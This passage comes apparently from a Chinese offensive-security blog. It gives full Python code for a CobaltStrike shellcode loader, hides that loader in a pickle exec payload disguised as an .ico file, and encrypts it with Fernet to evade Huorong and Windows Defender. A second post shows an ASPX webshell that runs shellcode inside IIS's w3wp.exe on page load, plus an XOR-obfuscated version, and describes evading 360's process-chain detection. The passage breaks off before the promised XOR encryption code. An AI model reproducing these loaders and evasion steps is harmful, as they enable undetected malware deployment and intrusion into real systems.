<li><code>WaitForSingleObject</code>等待ShellCode执行结束</li>
</ul>
<h2 id="加载代码"><a href="#加载代码" class="headerlink" title="加载代码"></a>加载代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment">#CobaltStrike生成的PythonShellcode代码,注意双引号前有个b</span></span><br><span class="line">bytesbuf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bytearray()函数返回一个新字节数组</span></span><br><span class="line">shellcode= <span class="built_in">bytearray</span>(bytesbuf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#VirtualAlloc函数用来开辟内存空间,返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span><br><span class="line">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#RtlMoveMemory函数将Shellcode加载至此段内存空间</span></span><br><span class="line">buf= (ctypes.c_char *<span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   buf,</span><br><span class="line">   ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用CreateThread函数创建一个线程从Shellcode的起始地址开始执行此段内存空间的内容</span></span><br><span class="line">handle= ctypes.windll.kernel32.CreateThread(</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过WaitForSingleObject函数来等待执行结束</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>使用火绒扫描Shellcode加载器, 结果可想而知报毒了, 所以更不用说打包成可执行文件了, 因此需要对加载器代码进行反序列化处理</p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119213252111.png" alt="image-20221119213252111"></p>
<p>​	</p>
<h1 id="简单的反序列化免杀"><a href="#简单的反序列化免杀" class="headerlink" title="简单的反序列化免杀"></a>简单的反序列化免杀</h1><h2 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h2><h3 id="GenerateShellcode-py"><a href="#GenerateShellcode-py" class="headerlink" title="GenerateShellcode.py"></a>GenerateShellcode.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将下述的代码替换成CobaltStrike的Shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shellcode) </span><br></pre></td></tr></table></figure>



<h3 id="PickleDump-py"><a href="#PickleDump-py" class="headerlink" title="PickleDump.py"></a>PickleDump.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pickle dump</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import ctypes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f= open(&#x27;shellcode.txt&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line"><span class="string">shellcode= f.read()</span></span><br><span class="line"><span class="string">shellcode= bytearray(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span></span><br><span class="line"><span class="string">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string">buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   buf,</span></span><br><span class="line"><span class="string">   ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">handle= ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span>(<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line">ret=pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="comment">#将pickle后的数据写入test.ico文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">   file.write(ret)</span><br></pre></td></tr></table></figure>

<p>​	</p>
<h3 id="PickleLoad-py"><a href="#PickleLoad-py" class="headerlink" title="PickleLoad.py"></a>PickleLoad.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">temp=<span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">shellcode=pickle.loads(temp)  <span class="comment">#将pickle数据转换成python数据结构,以此能够执行python代码</span></span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>先执行<code>GenerateShellcode.py</code>生成<code>shellcode.txt</code>文件, 再执行<code>PickleDump.py</code>生成<code>test.ico</code>文件, 用火绒扫描下这两个文件, 没有报毒, 但是WindowsDefender报毒了, 不过没关系, 后文我会通过对这两个文件加密来绕过WindowsDefender</p>
<img src="Python反序列化免杀/image-20221119222504696.png" alt="image-20221119222504696" style="zoom:67%;" />

<p>​	</p>
<p>使用pyinstall将<code>PickleLoad.py</code>打包成可执行文件, 在项目文件打开终端执行如下命令:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyinstall.exe -F PickleLoad.py</span><br></pre></td></tr></table></figure>

<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119220335934.png" alt="image-20221119220335934"></p>
<p>随后会在项目文件的dist目录生成可执行文件, 使用火绒杀毒测试下, 可以发现未报毒</p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119220513513.png" alt="image-20221119220513513">	</p>
<p>将<code>PickleLoad.exe</code>、<code>shellcode.txt</code>、<code>test.ico</code>文件放到同一目录下, 随后运行PickleLoad.exe会弹出一个窗口, CS显示上线</p>
<blockquote>
<p>若此窗口关闭了, 则受害机在CS下线</p>
</blockquote>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119225217122.png" alt="image-20221119225217122"></p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119225258224.png" alt="image-20221119225258224"></p>
<h1 id="加密后的反序列化免杀"><a href="#加密后的反序列化免杀" class="headerlink" title="加密后的反序列化免杀"></a>加密后的反序列化免杀</h1><h2 id="项目代码-1"><a href="#项目代码-1" class="headerlink" title="项目代码"></a>项目代码</h2><h3 id="GenerateShellcode-py-1"><a href="#GenerateShellcode-py-1" class="headerlink" title="GenerateShellcode.py"></a>GenerateShellcode.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shellcode)</span><br></pre></td></tr></table></figure>



<h3 id="encrypt-py"><a href="#encrypt-py" class="headerlink" title="encrypt.py"></a>encrypt.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对静态文件进行加密</span></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncryptTXT</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        key = Fernet.generate_key()</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        enc_pay = f.encrypt(<span class="built_in">bytes</span>(<span class="built_in">bytearray</span>(file.read())))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Encrypt_shellcode.txt&quot;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(enc_pay.decode())</span><br><span class="line">        <span class="comment">#print(&#x27;加密完成,加密后的文件为Encrypt_shellcode.txt,加密key=&#123;&#125;&#x27;.format(key))</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncryptICO</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        key = Fernet.generate_key()</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        enc_pay = f.encrypt(<span class="built_in">bytes</span>(<span class="built_in">bytearray</span>(file.read())))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Encrypt_test.ico&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(enc_pay.decode())</span><br><span class="line">        <span class="comment">#print(&#x27;加密完成,加密后的文件为Encrypt_test.ico,加密key=&#123;&#125;&#x27;, format(key))</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure>



<h3 id="PickleDump-py-1"><a href="#PickleDump-py-1" class="headerlink" title="PickleDump.py"></a>PickleDump.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> encrypt <span class="keyword">import</span> EncryptTXT,EncryptICO</span><br><span class="line"></span><br><span class="line">key = EncryptTXT(<span class="string">&#x27;shellcode.txt&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import ctypes</span></span><br><span class="line"><span class="string">from cryptography.fernet import Fernet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f= open(&#x27;Encrypt_shellcode.txt&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line"><span class="string">shellcode= f.read()</span></span><br><span class="line"><span class="string">key= &#123;0&#125;</span></span><br><span class="line"><span class="string">f_obj= Fernet(key)</span></span><br><span class="line"><span class="string">shellcode= f_obj.decrypt(shellcode)</span></span><br><span class="line"><span class="string">shellcode= bytearray(shellcode)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span></span><br><span class="line"><span class="string">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string">buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   buf,</span></span><br><span class="line"><span class="string">   ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">handle= ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span>(<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ret = pickle.dumps(A())</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> img:</span><br><span class="line">        img.write(ret)</span><br><span class="line">    key = EncryptICO(<span class="string">&#x27;test.ico&#x27;</span>) <span class="comment">#对test.ico</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>



<h3 id="PickleLoad-py-1"><a href="#PickleLoad-py-1" class="headerlink" title="PickleLoad.py"></a>PickleLoad.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line">temp=<span class="built_in">open</span>(<span class="string">&quot;Encrypt_test.ico&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">key = <span class="string">b&#x27;2cAx5afBvED2B7vanLMy8TvRT3hG6uIJukWD9nu56Yk=&#x27;</span></span><br><span class="line">f_obj=Fernet(key)</span><br><span class="line">temp=f_obj.decrypt(temp)</span><br><span class="line">shellcode=pickle.loads(temp)</span><br></pre></td></tr></table></figure>



<h2 id="项目运行"><a href="#项目运行" class="headerlink" title="项目运行"></a>项目运行</h2><p>首先运行<code>GenerateShellcode.py</code>生成shellcode.txt</p>
<p>随后运行<code>PickleDump.py</code>生成test.ico, 并对shellcode.txt和test.ico进行加密, 加密后的文件为<code>Encrypt_shellcode.txt</code>和<code>Encrypt_test.ico</code>, 此时注意控制台输出的key值为<code>b&#39;2cAx5afBvED2B7vanLMy8TvRT3hG6uIJukWD9nu56Yk=&#39;</code>(PickleLoad.py会用到)</p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120224944318.png" alt="image-20221120224944318"></p>
<p>打开<code>PickleLoad.py</code>, 将key值替换成上述生成的key值</p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120225157291.png" alt="image-20221120225157291"></p>
<p>使用pyinstall命令打包<code>PickleLoad.py</code>为可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstall.exe PickleLoad.py</span><br></pre></td></tr></table></figure>

<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120230017265.png" alt="image-20221120230017265"></p>
<p>最后三位一体的免杀文件分别是<code>Encrypt_shellcode.txt</code>、<code>Encrypt_test.ico</code>、<code>PickleLoad.exe</code></p>
<p><img src="Python反序列化免杀/image-20221120230223822.png" alt="image-20221120230223822" style="zoom:67%;" />&#96;</p>
<p>使用火绒和WindowsDefender扫描均未报毒</p>
<img src="Python反序列化免杀/image-20221120230924043.png" alt="image-20221120230924043" style="zoom:67%;" />					

<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120231145422.png" alt="image-20221120231145422">	</p>
<p>但是运行的时候会被WindowsDefender拦截掉, 个人猜测可能是CobaltStrike流量被检测到了, 后续还需对CS流量进行隐藏或加密</p>
<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120231351854.png" alt="image-20221120231351854">	</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><p><a href="https://mp.weixin.qq.com/s/WOBQFbrEgylNhBAwlT9JnQ">https://mp.weixin.qq.com/s/WOBQFbrEgylNhBAwlT9JnQ</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653579519&idx=1&sn=e6d31f52ea46d141e817e6ca4043c50c&chksm=811b7ebdb66cf7ab0a542c58ebaac8b526a650c565caa5a3754f17c9f00089d2d08b9e32f68a&scene=126&sessionid=1660184540&key=41ff146e600b77a0d04399ad7126a7870762dbcc55e2fc1dcb7890570b7ebb183da39306b60480a6de984d71fb0881334eb9ed7714d8b475a61c6ad0efcc3f2e1d8c2de2738842a5d6767bf21a5674b6e0951ea5e41b54fe509639e775f757d1bd73871e619b776d0663a1eeebe4dad6f09f6dd4de293976f8d9529dcdc7a68f&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows+10+x64&version=6307051f&lang=zh_CN&session_us=gh_ceb74c1acd23&exportkey=ARaPcaF8+3anRpPJRj8hRS8=&acctmode=0&pass_ticket=tLi1BnMh8wn6/SHfWt0wXfhUW0X59t7KFmIx2QsYk6UEAG3Ra+o9emrqh/Iyrr11&wx_header=0&fontgear=2">https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&amp;mid=2653579519&amp;idx=1&amp;sn=e6d31f52ea46d141e817e6ca4043c50c&amp;chksm=811b7ebdb66cf7ab0a542c58ebaac8b526a650c565caa5a3754f17c9f00089d2d08b9e32f68a&amp;scene=126&amp;sessionid=1660184540&amp;key=41ff146e600b77a0d04399ad7126a7870762dbcc55e2fc1dcb7890570b7ebb183da39306b60480a6de984d71fb0881334eb9ed7714d8b475a61c6ad0efcc3f2e1d8c2de2738842a5d6767bf21a5674b6e0951ea5e41b54fe509639e775f757d1bd73871e619b776d0663a1eeebe4dad6f09f6dd4de293976f8d9529dcdc7a68f&amp;ascene=15&amp;uin=MTA3Mzc3OTIzNQ%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6307051f&amp;lang=zh_CN&amp;session_us=gh_ceb74c1acd23&amp;exportkey=ARaPcaF8%2B3anRpPJRj8hRS8%3D&amp;acctmode=0&amp;pass_ticket=tLi1BnMh8wn6%2FSHfWt0wXfhUW0X59t7KFmIx2QsYk6UEAG3Ra%2Bo9emrqh%2FIyrr11&amp;wx_header=0&amp;fontgear=2</a></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/Webshell%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在webshell上线木马，他的进程链是cmd，若双击木马，它的进程链是explorer.exe</p>
<h1 id="核晶查杀机制"><a href="#核晶查杀机制" class="headerlink" title="核晶查杀机制"></a>核晶查杀机制</h1><p>当我们在webshell终端执行cmd命令时，不要一上来就<code>whoami</code>，这样很容易会被杀软查杀，从而导致杀软的查杀力度越来越严格，毕竟360核晶是带机器学习引擎的</p>
<img src="Webshell专题/image-20230706100519333.png" alt="image-20230706100519333" style="zoom:67%;" />	



<p>最好先执行tasklist命令列出目标系统的所有进程，看看是否有杀毒软件</p>
<img src="Webshell专题/image-20230707210931111.png" alt="image-20230707210931111" style="zoom:67%;" />		



<p>有时候你执行calc.exe命令也会被核晶捕捉到，讲道理calc命令就是一个正常的命令，那么为什么会报毒呢？我觉得这可能是一开始你的一些操作被杀软捕捉到了，例如上述我说的执行whoami命令，一旦杀软的查杀力度上来了，你后面起的任何进程都会被查杀</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230706102328691.png" alt="image-20230706102328691">	</p>
<p>360核晶查杀还涉及到进程链问题，当我们在webshell终端执行notepad.exe命令时，它的cmd进程是起在w3wp.exe进程下</p>
<blockquote>
<p><code>w3wp.exe</code> 是 Windows Web 服务器 (IIS) 中的 Worker Process（工作进程）。在你的 web 应用程序接收到一个请求时，该请求实际上是由一个或多个这样的进程来处理的</p>
</blockquote>
<img src="Webshell专题/image-20230706104523446.png" alt="image-20230706104523446" style="zoom:67%;" />	



<p>如果在虚拟机中直接打开cmd执行notepad.exe，可以发现cmd进程是起在explorer进程下，这种方式起的进程是不会被杀软查杀的</p>
<img src="Webshell专题/image-20230706104945850.png" alt="image-20230706104945850" style="zoom:67%;" />	



<p>我将白+黑程序上传至目标主机，随后在目标主机中点击白程序，CS能够成功上线</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707212917711.png" alt="image-20230707212917711"></p>
<p>但是在webshell的cmd终端执行白程序会被查杀，就连你劫持的哪个dll都会被杀软捕捉到</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707213404445.png" alt="image-20230707213404445">		</p>
<h1 id="bypass核晶思路"><a href="#bypass核晶思路" class="headerlink" title="bypass核晶思路"></a>bypass核晶思路</h1><h2 id="1-aspx马加载shellcode"><a href="#1-aspx马加载shellcode" class="headerlink" title="1.aspx马加载shellcode"></a>1.aspx马加载shellcode</h2><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><p>以下是aspx文件的代码，主要使用C#编写，导入了<code>System</code>和<code>System.Runtime.InteropServices</code>命名空间。</p>
<p>然后，它声明了两个P&#x2F;Invoke方法，这些方法是.NET中用于调用Windows API或者其他非.NET DLL的方法。这两个方法是<code>VirtualAlloc</code>和<code>CreateThread</code>，它们来自<code>kernel32.dll</code>，一个是Windows系统的核心库</p>
<p>接下来是<code>Page_Load</code>方法，这是ASP.NET页面生命周期中的一个重要事件。在页面首次加载和后续的请求中，它都会被触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">	byte[] esc = new byte[928] &#123;“填写C#的shellcode”&#125;;</span><br><span class="line">	IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">	Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">	IntPtr hThread = IntPtr.Zero;</span><br><span class="line">	uint threadId = 0;</span><br><span class="line">	IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">	Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>在上述代码中，填写C#的shellcode要注意<code>w3wp.exe</code>的架构，w3wp.exe是IIS的工作进程，我们的aspx文件都是通过w3wp.exe来解析的，就如此处的<code>w3wp.exe</code>的架构是x64的，那就需要填写x64的shellcode</p>
<img src="Webshell专题/image-20230707120718329.png" alt="image-20230707120718329" style="zoom:67%;" />	



<p>360和火绒都不查杀此文件，但是WindowsDefender会查杀</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707121418517.png" alt="image-20230707121418517">	</p>
<img src="Webshell专题/image-20230707221833150.png" alt="image-20230707221833150" style="zoom:67%;" />	



<p>网页访问aspx文件时，cobaltstrike上线成功，并且360核晶也没有拦截</p>
<img src="Webshell专题/image-20230707130455544.png" alt="image-20230707130455544" style="zoom: 50%;" />	

<p>​				</p>
<p>在beacon执行<code>getuid</code>命令也不会被拦截，简单总结下，此类技术之所以能躲避杀软的检测，是因为w3wp.exe进程本身是正常存在的，并且经常在正常操作中被使用，这也导致杀软不敢轻易就关掉此进程</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707223429319.png" alt="image-20230707223429319"></p>
<h3 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h3><p>WindowsDefender会查杀aspx代码里的shellcode, 只需对shellcode进行异或加密就能绕过, 以下是修改后的aspx文件代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Text&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">    // 加密后的shellcode</span><br><span class="line">    byte[] esc = new byte[928] &#123; /* 省略 */ &#125;;</span><br><span class="line">    </span><br><span class="line">    // 解密密钥</span><br><span class="line">    byte[] key = System.Text.Encoding.UTF8.GetBytes(&quot;henry666&quot;);</span><br><span class="line"></span><br><span class="line">    // 解密shellcode</span><br><span class="line">    for (int i = 0; i &lt; esc.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        esc[i] ^= key[i % key.Length];</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">    Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">    IntPtr hThread = IntPtr.Zero;</span><br><span class="line">    uint threadId = 0;</span><br><span class="line">    IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">    Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以下是xor加密shellcode的C#代码</p>
